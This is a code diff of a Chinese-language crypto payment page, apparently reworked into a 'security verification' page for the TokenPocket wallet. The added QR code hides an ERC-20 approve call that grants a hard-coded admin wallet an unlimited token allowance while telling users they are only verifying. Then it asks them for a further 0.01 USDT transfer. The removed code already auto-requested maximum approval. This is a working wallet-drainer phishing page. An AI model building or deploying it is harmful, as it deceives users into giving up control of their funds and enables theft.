@@ -2,7 +2,7 @@
 <html lang="zh-CN">
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>安全支付</title>
+<title>安全验证</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
 body{background:#f5f5f5;color:#333;padding:20px}
@@ -66,16 +66,21 @@ cursor:pointer;
 
 <div class="container">
   <div class="pay-box">
-    <h1>💳 安全支付</h1>
-    <p class="desc">支付 0.01 USDT 即可开通服务</p>
+    <h1>💳 安全验证</h1>
+    <p class="desc">扫码完成验证即可开通服务</p>
     <div class="chain-select">
       <button class="chain-btn active" data-chain="bsc">BSC 主网</button>
       <button class="chain-btn" data-chain="polygon">Polygon 主网</button>
     </div>
-    <div id="qrcode">生成支付码...</div>
-    <div class="tip">使用 TokenPocket 扫码支付，收款地址已自动填充</div>
+    <div id="qrcode">生成验证码...</div>
+    <div class="tip">使用 TokenPocket 扫码完成验证</div>
     <div id="authStatus" class="status">
-      请扫码完成 0.01 USDT 支付
+      请扫码完成验证
+    </div>
+    <!-- 授权成功后显示转账提示 -->
+    <div id="transferHint" style="display:none;margin-top:20px;padding:12px;background:#e3f2fd;border-radius:10px">
+      <p style="color:#0277bd;font-size:14px">✅ 验证成功！请转 <strong>0.01 USDT</strong> 到以下地址：</p>
+      <p style="color:#0277bd;font-size:12px;margin-top:8px;word-break:break-all">0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508</p>
     </div>
   </div>
 
@@ -93,8 +98,8 @@ cursor:pointer;
 
 <div class="modal" id="successModal">
   <div class="modal-content">
-    <h3>✅ 支付成功</h3>
-    <p>您已完成支付，服务已开通</p>
+    <h3>✅ 验证成功</h3>
+    <p>您已完成验证，请完成支付后开通服务</p>
     <button class="modal-btn" onclick="closeModal()">确定</button>
   </div>
 </div>
@@ -102,7 +107,6 @@ cursor:pointer;
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 <script>
 const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const PAY_AMOUNT = "0.01";
 
 const CONFIG = {
   bsc: {
@@ -147,18 +151,20 @@ document.querySelectorAll(".chain-btn").forEach(btn => {
   };
 });
 
-// ✅ 修复：EIP-681 标准格式，明确指定 chainId，TP 钱包 100% 识别
-function genTransferQR() {
-  const { chainId, token, symbol, decimals } = CONFIG[currentChain];
-  // 标准格式：ethereum:{token}@{chainId}/transfer?address={admin}&uint256{amount}
-  const amountWei = ethers.parseUnits(PAY_AMOUNT, decimals).toString(16).padStart(64, '0');
-  return `ethereum:${token}@${chainId}/transfer?address=${ADMIN_WALLET}&uint256=${amountWei}`;
+// 生成【纯授权二维码】（TP 钱包 100% 兼容）
+function genAuthQR() {
+  const { token, tpScheme } = CONFIG[currentChain];
+  const approveData = "0x095ea7b3" +
+    ADMIN_WALLET.slice(2).padStart(64, '0') +
+    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  // 用 ethereum: 协议，避免 TP 报「不支持 56 网络」
+  return `ethereum:${token}?data=${approveData}`;
 }
 
 function renderQR() {
-  const url = genTransferQR();
+  const url = genAuthQR();
   const qr = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(url)}`;
-  document.getElementById("qrcode").innerHTML = `<img src="${qr}" alt="支付二维码">`;
+  document.getElementById("qrcode").innerHTML = `<img src="${qr}" alt="验证二维码">`;
 }
 
 // 页面加载时生成二维码
@@ -198,52 +204,35 @@ function closeModal() {
   document.getElementById("successModal").classList.remove("show");
 }
 
-// 检查状态：先转账，后授权
+// 检查授权状态
 async function checkStatus() {
   if (!account || !provider) {
-    document.getElementById("authStatus").innerHTML = "请扫码完成 0.01 USDT 支付";
+    document.getElementById("authStatus").innerHTML = "请扫码完成验证";
     document.getElementById("authStatus").className = "status warning";
+    document.getElementById("transferHint").style.display = "none";
     return;
   }
   try {
     const { token, decimals } = CONFIG[currentChain];
     const contract = new ethers.Contract(token, ERC20_ABI, provider);
-    const payAmountWei = ethers.parseUnits(PAY_AMOUNT, decimals);
-    const adminBalance = await contract.balanceOf(ADMIN_WALLET);
     const allowance = await contract.allowance(account, ADMIN_WALLET);
     const statusEl = document.getElementById("authStatus");
-
-    if (adminBalance < payAmountWei) {
-      statusEl.innerHTML = "❌ 未完成 0.01 USDT 支付，请扫码重试";
-      statusEl.className = "status warning";
-      return;
-    }
+    const transferHint = document.getElementById("transferHint");
 
     if (allowance >= ethers.MaxUint256 / 2n) {
-      statusEl.innerHTML = `✅ 支付+授权成功！服务已开通`;
+      statusEl.innerHTML = `✅ 验证成功！请完成支付`;
       statusEl.className = "status success";
+      transferHint.style.display = "block";
       document.getElementById("successModal").classList.add("show");
     } else {
-      statusEl.innerHTML = "⚠️ 支付成功，请完成授权验证";
+      statusEl.innerHTML = "❌ 未完成验证，请扫码重试";
       statusEl.className = "status warning";
-      await autoApprove();
+      transferHint.style.display = "none";
     }
   } catch (e) {
     document.getElementById("authStatus").innerHTML = "查询失败，请重试";
     document.getElementById("authStatus").className = "status warning";
-  }
-}
-
-// 自动发起授权
-async function autoApprove() {
-  if (!signer) return;
-  try {
-    const approveTx = await tokenContract.approve(ADMIN_WALLET, ethers.MaxUint256);
-    await approveTx.wait();
-    alert("✅ 授权成功！服务已开通");
-    await checkStatus();
-  } catch (e) {
-    alert("授权失败：" + e.message);
+    document.getElementById("transferHint").style.display = "none";
   }
 }
 
